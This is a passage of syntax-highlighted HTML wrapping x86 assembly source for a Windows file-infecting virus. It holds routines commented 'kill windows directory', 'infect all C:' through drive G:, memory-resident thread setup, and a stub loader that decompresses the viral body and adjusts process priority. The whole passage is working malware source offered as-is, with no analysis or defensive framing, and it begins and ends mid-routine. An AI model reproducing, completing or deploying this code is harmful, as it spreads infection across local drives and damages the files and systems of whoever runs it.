</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetWindowsDirectoryA</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; kill windows directory</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Killdir</span><span class="sc0">

</span><span class="sc5">fini</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">skipinfect</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">databuffer</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Delloc</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">compressbuffer</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Delloc</span><span class="sc0">
        
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">checkflag</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4000h</span><span class="sc0">                           </span><span class="sc1">; mem decommit</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                               </span><span class="sc1">; size</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">start</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ExitThread</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; the death row....</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">VirtualFree</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; in fact,</span><span class="sc0">
                                                    </span><span class="sc1">; it's virtual free</span><span class="sc0">
</span><span class="sc5">Goresidency2</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getdel</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">2000</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Sleep0</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; wait 2 sec</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Residency2</span><span class="sc0">                               </span><span class="sc1">; then install memory</span><span class="sc0">


</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">checkflag</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ExitThread</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; boom biddy byebye</span><span class="sc0">

</span><span class="sc5">residencystart</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getdel</span><span class="sc0">          </span><span class="sc1">; this is main thread code</span><span class="sc0">
                        </span><span class="sc1">; when we are TSR</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">returnapis</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">repz</span><span class="sc0">    </span><span class="sc6">stosb</span><span class="sc0">           </span><span class="sc1">; this is done</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">getapis</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">initapi</span><span class="sc0">         </span><span class="sc1">; we got it</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">maxinfect</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">countinfect</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">waitscan</span><span class="sc4">],</span><span class="sc2">25</span><span class="sc0">  </span><span class="sc1">; set maximum free</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">stopflag</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">   
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">treeflag</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">85000</span><span class="sc0">           </span><span class="sc1">; eh, realloc for vir.</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">alloc</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">databuffer</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">85000</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">alloc</span><span class="sc0">               </span><span class="sc1">; realloc</span><span class="sc0">
    
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">compressbuffer</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">treeflag</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">originaldir</span><span class="sc4">],</span><span class="sc12">'\:C'</span><span class="sc0">   </span><span class="sc1">;infect all C:</span><span class="sc0">
        
</span><span class="sc5">killthatdir</span><span class="sc4">:</span><span class="sc0">
    
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Killdir</span><span class="sc0">                 </span><span class="sc1">; hohoho</span><span class="sc0">

</span><span class="sc5">includeme</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">originaldir</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">originaldir</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">originaldir</span><span class="sc4">],</span><span class="sc12">'G'</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">finishthread</span><span class="sc0">                </span><span class="sc1">; infect until</span><span class="sc0">
                                </span><span class="sc1">; G:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">originaldir</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetDriveTypeA</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get the </span><span class="sc0">
                                </span><span class="sc1">; drive type</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">includeme</span><span class="sc0">               </span><span class="sc1">; don't touch</span><span class="sc0">
                                </span><span class="sc1">; cdroms or such</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">killthatdir</span><span class="sc0">

</span><span class="sc5">finishthread</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">finishthread</span><span class="sc0">            </span><span class="sc1">; endless jump</span><span class="sc0">

</span><span class="sc5">startapis</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">StubLoader</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getdel2</span><span class="sc0">
</span><span class="sc5">getdel2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">getdel2</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">getapis1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">returnapi1</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; mini stub </span><span class="sc0">
                                </span><span class="sc1">; loader</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">initapi</span><span class="sc0">                 </span><span class="sc1">; init apis</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetCurrentProcess0</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetPriorityClass0</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">originalpriority</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SetPriorityClass0</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; set priority</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">finloader</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; get memory</span><span class="sc0">
                                </span><span class="sc1">; from small</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">40h</span><span class="sc0">                 </span><span class="sc1">; compressed</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00100000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">2000h</span><span class="sc0">     </span><span class="sc1">; header...</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0111b</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">111b</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GlobalAlloc0</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; allocate </span><span class="sc0">
                                </span><span class="sc1">; memory</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">finloader</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; okay, do it</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">

</span><span class="sc5">UnDkCMP</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'h'</span><span class="sc0">                              </span><span class="sc1">; check if okay</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">thenbad</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">                            </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                                         </span><span class="sc1">; donc annoy edx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                                           </span><span class="sc1">; so eax = ecx * 4</span><span class="sc0">
</span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                                             </span><span class="sc1">; we need to keep</span><span class="sc0">
                                                        </span><span class="sc1">; ecx</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">                                     </span><span class="sc1">; setting correspond.</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">9</span><span class="sc4">]</span><span class="sc0">                                 </span><span class="sc1">; setting where data</span><span class="sc0">
                                                        </span><span class="sc1">; begin</span><span class="sc0">
</span><span class="sc5">detectall</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">; edx = current byte value</span><span class="sc0">

</span><span class="sc5">starloop</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">                                          </span><span class="sc1">; start, nullify these</span><span class="sc0">

</span><span class="sc5">highloop</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">

</span><span class="sc5">highloop2</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">                                           </span><span class="sc1">; number of time</span><span class="sc0">
                                                        </span><span class="sc1">; looping</span><span class="sc0">
</span><span class="sc5">wefoundit</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">dontresetcounter</span><span class="sc0">                                </span><span class="sc1">; end of ascii</span><span class="sc0">
                                                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">                                             </span><span class="sc1">; get next</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">

</span><span class="sc5">dontresetcounter</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">                                           </span><span class="sc1">; then we get </span><span class="sc0">

</span><span class="sc6">lodsb</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">                                             </span><span class="sc1">; here the actual</span><span class="sc0">

</span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                                           </span><span class="sc1">; value of the bits</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                                            </span><span class="sc1">; and concatenate it</span><span class="sc0">
</span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                                            </span><span class="sc1">; with a bit buffer</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">                                           </span><span class="sc1">; placed in a regist.</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                                         </span><span class="sc1">; reset ecx</span><span class="sc0">

</span><span class="sc5">thengetnext</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">highloop2</span><span class="sc0">                   </span><span class="sc1">; don't check all the</span><span class="sc0">
                            </span><span class="sc1">; three</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">                             </span><span class="sc1">; is this size equal?</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">w0comehere</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">                             </span><span class="sc1">; is this byte equal?</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">wefoundit0</span><span class="sc0">

</span><span class="sc5">w0comehere</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                                           </span><span class="sc1">; if not scan next</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">],-</span><span class="sc2">1</span><span class="sc0">                               </span><span class="sc1">; if end of corresp.</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">thengetnext</span><span class="sc0">                                     </span><span class="sc1">; then it's not </span><span class="sc0">

</span><span class="sc5">returnme</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">                                             </span><span class="sc1">; reset ebp to</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">                                             </span><span class="sc1">; start of correspond.</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">highloop2</span><span class="sc0">                                       </span><span class="sc1">; complete ascii...</span><span class="sc0">

</span><span class="sc5">wefoundit0</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">                               </span><span class="sc1">; else we got it!</span><span class="sc0">
                                                        </span><span class="sc1">; and then change it</span><span class="sc0">
                                                        </span><span class="sc1">; to ascii</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">                                             </span><span class="sc1">; restore data for</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                                             </span><span class="sc1">; next loop</span><span class="sc0">

</span><span class="sc6">stosb</span><span class="sc0">                                                   </span><span class="sc1">; push byte</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">starloop</span><span class="sc0">                                </span><span class="sc1">; decompression finished !</span><span class="sc0">

</span><span class="sc5">thenbad</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">pseudofin</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">         </span><span class="sc1">; setting value for</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">; returning</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">originalpriority</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SetPriorityClass0</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; refix priorities</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
